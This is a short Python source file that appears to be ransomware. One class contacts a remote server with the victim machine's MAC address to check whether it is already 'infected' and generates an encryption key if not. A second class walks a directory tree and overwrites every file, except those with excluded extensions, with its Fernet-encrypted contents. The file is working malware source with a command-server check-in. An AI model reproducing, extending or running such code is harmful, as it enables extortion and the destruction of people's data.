from cryptography.fernet import Fernet
import os
import requests
from device_infos import get_mac_address
from env import BASE_API_URL


class KeyGenerator:
    def keyExist(self):
        mac_address = get_mac_address()
        response = requests.get(BASE_API_URL + '/api/is-infected/' + mac_address)
        if response.status_code == 200:
            data = response.json()
            return data['is_infected']
        return False
        

    def generateKey(self):
        if self.keyExist() is not True:
            return Fernet.generate_key()


class Encrypter:
    _fernet : Fernet
    _key : bytes

    def __init__(self, key) -> None :
        self._key = key
        self._fernet = Fernet(self._key)
    

    def encrypt(self, path, *excludeExtensions) -> int : 
        i = 0
        for root, dirs, files in os.walk(path):
            for entry in files:
                if not entry.endswith(excludeExtensions):
                    with open(os.path.join(root, entry), 'rb') as file:
                        original = file.read()
                    encrypted = self._fernet.encrypt(original)
                    with open(os.path.join(root, entry), 'wb') as encrypted_file:
                        encrypted_file.write(encrypted)
            i += 1
        return i
    